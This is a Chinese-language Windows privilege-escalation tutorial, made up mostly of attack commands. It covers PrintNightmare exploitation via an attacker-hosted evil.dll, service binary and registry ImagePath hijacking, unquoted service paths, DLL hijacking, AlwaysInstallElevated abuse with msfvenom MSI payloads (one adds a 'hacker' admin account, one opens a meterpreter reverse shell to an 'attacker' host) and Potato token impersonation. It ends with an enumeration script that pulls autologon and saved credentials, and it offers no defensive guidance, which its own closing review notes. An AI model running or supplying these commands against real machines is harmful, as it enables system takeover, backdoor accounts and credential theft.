# Windows提权技术

### 2.1 内核漏洞提权

Windows内核漏洞提权是最直接的提权方式，通过内核漏洞将普通用户权限提升到SYSTEM。

**常见内核漏洞**

| CVE | 漏洞名称 | 影响版本 | 利用类型 |
|-----|---------|---------|---------|
| CVE-2021-1675 | PrintNightmare | Win10/Server 2019-2022 | 打印服务漏洞 |
| CVE-2020-0787 | Background Intelligent Transfer | Win7-Win10 | 任意文件移动 |
| CVE-2019-0808 | Win32k | Win7/Server 2008 | UAF漏洞 |
| CVE-2018-8453 | Win32k | Win10/Server 2016 | UAF漏洞 |
| CVE-2017-0263 | Win32k | Win10 | UAF漏洞 |
| CVE-2016-7255 | Win32k | Win7-Win10 | UAF漏洞 |
| CVE-2014-4113 | Win32k | Win7-Win8.1 | UAF漏洞 |

**PrintNightmare (CVE-2021-1675) 利用示例**

```
# 查看系统补丁
wmic qfe list brief /format:table | findstr KB500

# 利用PrintNightmare
# 需要准备恶意DLL和SMB共享
python3 CVE-2021-1675.py DOMAIN/user:password@targetIP \\attacker\share\evil.dll

# 使用Mimikatz
mimikatz # misc::printnightmare /server:target /dll:\\attacker\share\evil.dll
```

**内核漏洞利用流程**

```
1. 信息收集
   - 系统版本: systeminfo | findstr /B /C:"OS"
   - 补丁列表: wmic qfe list brief /format:table
   - 架构: echo %PROCESSOR_ARCHITECTURE%

2. 漏洞匹配
   - 使用Windows-Exploit-Suggester匹配内核漏洞
   - 使用Watson自动检测缺失补丁
   - 查找公开exploit

3. 编译/上传exploit
   - 编译为对应架构(x86/x64)
   - 上传到目标可写目录

4. 执行提权
   - 运行exploit
   - 获取SYSTEM权限shell

5. 后续操作
   - 添加用户
   - 获取凭证
   - 持久化
```

**Windows-Exploit-Suggester使用**

```bash
# 在目标上收集信息
systeminfo > systeminfo.txt

# 下载工具
git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git

# 更新数据库
python windows-exploit-suggester.py --update

# 分析
python windows-exploit-suggester.py --database 2024-01-01-mssb.xls \
    --systeminfo systeminfo.txt
```

### 2.2 服务配置缺陷

**服务权限配置不当**

Windows服务的权限如果配置不当，低权限用户可以修改服务配置：

```cmd
# 枚举所有服务及权限
sc query state= all
wmic service list brief

# 使用accesschk检查服务权限
accesschk.exe -uwcqv "Authenticated Users" *

# 查找可修改的服务
accesschk.exe -uwcqv "Users" *
```

**可写服务路径利用**

如果服务二进制路径可被普通用户修改：

```cmd
# 查看服务配置
sc qc VulnService

# 如果BINARY_PATH_NAME指向用户可写目录
# 替换服务二进制为恶意程序
copy /Y evil.exe "C:\Vulnerable\Path\service.exe"

# 重启服务
sc stop VulnService
sc start VulnService
```

**修改服务路径**

如果对服务有 SERVICE_CHANGE_CONFIG 权限：

```cmd
# 修改服务二进制路径
sc config VulnService binPath= "C:\evil\payload.exe"

# 重启服务以SYSTEM权限执行
sc stop VulnService
sc start VulnService
```

PowerShell版本：

```powershell
# 修改服务路径
Set-Service -Name VulnService -BinaryPathName "C:\evil\payload.exe"

# 重启服务
Restart-Service -Name VulnService -Force
```

### 2.3 未加引号的服务路径

当服务路径包含空格且未加引号时，Windows会按序尝试执行路径中的每个可执行文件：

```
服务路径: C:\Program Files\My Service\service.exe

Windows执行顺序:
  1. 尝试执行 C:\Program.exe     <- 如果存在则执行
  2. 尝试执行 C:\Program Files\My.exe  <- 如果存在则执行
  3. 最终执行 C:\Program Files\My Service\service.exe
```

**枚举未加引号服务**

```cmd
# 使用wmic查找
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# 使用PowerShell
Get-CimInstance -ClassName Win32_Service | 
    Where-Object { $_.PathName -notlike '"*' -and $_.PathName -like '* *' } |
    Select-Object Name, DisplayName, PathName
```

**利用步骤**

```cmd
# 1. 找到未加引号服务
sc qc UnquotedService
# BINARY_PATH_NAME = C:\Program Files\Some Service\bin\service.exe

# 2. 检查可写目录
icacls "C:\Program Files\Some Service"
# 如果Users有写权限

# 3. 创建恶意可执行文件
copy payload.exe "C:\Program.exe"
# 或
copy payload.exe "C:\Program Files\Some.exe"

# 4. 重启服务
sc stop UnquotedService
sc start UnquotedService
```

### 2.4 弱权限利用

**可写目录利用**

```cmd
# 查找全权限目录
icacls "C:\*" 2>nul | findstr "F" | findstr "Users"

# 常见弱权限目录
# C:\Windows\Temp
# C:\Windows\Tasks
# C:\ProgramData\
# C:\Users\Public\

# 检查服务目录权限
icacls "C:\Program Files\Vulnerable Service\"
# 如果Users:(W)或Users:(M)则可利用
```

**DLL劫持**

如果服务加载的DLL位于可写目录：

```cmd
# 使用Process Monitor监控DLL加载
# 过滤: Path包含服务名, Result=NAME NOT FOUND

# 在可写目录放置恶意DLL
copy evil.dll "C:\Program Files\Vulnerable Service\missing.dll"

# 重启服务
sc stop VulnService
sc start VulnService
```

**注册表权限**

```cmd
# 检查服务注册表权限
accesschk.exe -k -q "HKLM\SYSTEM\CurrentControlSet\Services\VulnService"

# 如果可写，修改ImagePath
reg add "HKLM\SYSTEM\CurrentControlSet\Services\VulnService" /v ImagePath /t REG_EXPAND_SZ /d "C:\evil\payload.exe" /f
```

### 2.5 AlwaysInstallElevated

当注册表设置`AlwaysInstallElevated`为1时，Windows Installer（MSI）包以SYSTEM权限安装，无论当前用户权限如何。

```cmd
# 检查是否启用
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# 如果两个值都为1，则可利用
```

**利用方法**

```bash
# 使用msfvenom生成恶意MSI
msfvenom -p windows/exec CMD='net user hacker P@ss123! /add' \
    -f msi -o evil.msi

# 或生成反向shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 \
    -f msi -o shell.msi

# 执行MSI
msiexec /quiet /qn /i evil.msi
```

### 2.6 令牌模拟

Windows令牌模拟（Token Impersonation）允许进程获取其他用户的安全令牌，以该用户身份执行操作。

**Potato系列工具**

```bash
# RottenPotato - 利用DCOM/RPC实现NTLM中继
# JuicyPotato - RottenPotato的改进版
# PrintSpoofer - 利用打印服务
# GodPotato - Windows Server 2012-2022

# PrintSpoofer利用
PrintSpoofer.exe -i -c "cmd.exe"

# GodPotato利用
GodPotato.exe -cmd "cmd /c whoami"

# JuicyPotato利用
JuicyPotato.exe -l 1337 -p c:\Windows\System32\cmd.exe -t * -c {CLSID}
```

**令牌模拟原理**

```
1. 获取SYSTEM权限令牌
   - 通过COM服务（如BITS、DCOM）
   - 通过NTLM中继
   - 通过打印服务

2. 模拟令牌
   - 使用ImpersonateNamedPipeClient
   - 使用ImpersonateLoggedOnUser
   - 通过named pipe

3. 以SYSTEM身份执行命令
   - CreateProcessWithTokenW
   - CreateProcessAsUserW
```

**meterpreter令牌模拟**

```bash
# 在meterpreter中
meterpreter> use incognito
meterpreter> list_tokens -u
meterpreter> impersonate_token "NT AUTHORITY\SYSTEM"
meterpreter> getuid  # 确认权限
```

### 2.7 Windows枚举脚本

**WinPEAS**

```cmd
# 下载并运行WinPEAS
winpeas.exe

# 或运行批处理版本
winpeas.bat
```

**PowerUp PowerShell脚本**

```powershell
# 导入PowerUp
Import-Module .\PowerUp.ps1

# 运行所有检查
Invoke-AllChecks

# 检查未加引号服务路径
Get-UnquotedService

# 检查弱服务权限
Get-ModifiableService

# 检查可写服务二进制
Get-ModifiableServiceFile

# 检查AlwaysInstallElevated
Get-RegistryAlwaysInstallElevated

# 检查自动登录凭据
Get-RegistryAutoLogon

# 写入恶意服务二进制
Write-ServiceBinary -Name 'VulnService' -Command 'net user hacker P@ss123! /add'

# 恢复服务
Restore-ServiceBinary -Name 'VulnService'
```

**手动枚举脚本**

```batch
@echo off
echo ===== Windows Privilege Escalation Enumeration =====
echo.

echo [1] System Information
systeminfo | findstr /B /C:"OS" /C:"System Type" /C:"Hotfix"
echo.

echo [2] Current User
whoami /all
echo.

echo [3] Network Information
ipconfig /all
netstat -ano
echo.

echo [4] Running Services
sc query state= all | findstr "SERVICE_NAME DISPLAY_NAME STATE"
echo.

echo [5] Unquoted Service Paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
echo.

echo [6] Scheduled Tasks
schtasks /query /fo TABLE /v | findstr /v /i "Microsoft"
echo.

echo [7] Installed Software
wmic product get name,version
echo.

echo [8] Autologon Credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr "DefaultUserName DefaultPassword"
echo.

echo [9] AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul
echo.

echo [10] Unattended Install Files
dir /b /s C:\Windows\Panther\*.xml 2>nul
dir /b /s C:\Windows\System32\sysprep\*.xml 2>nul
echo.

echo [11] Saved Credentials
cmdkey /list
echo.

echo [12] Environment Variables
set
echo.

echo ===== Enumeration Complete =====
```

---

---

## 📋 内容审核与补充建议

> 针对「Windows提权技术」部分的内容审核结果：

### 🎯 实战练习
- ⚠️ 缺少practice相关内容

### 🛡️ 防御方案
- ⚠️ 缺少defense相关内容

### 📖 参考资料
- ⚠️ 缺少参考资料/延伸阅读

---

## 📌 拓展学习资源

### 推荐学习路径
- 理论基础 → 工具实践 → 实战演练 → 深度研究
- 建议搭建本地实验环境进行动手练习

### 相关工具与资源
- 在线实验平台：Hack The Box、TryHackMe、VulnHub
- 技术文档：官方文档、RFC、OWASP 指南
- 社区资源：GitHub、安全论坛、技术博客
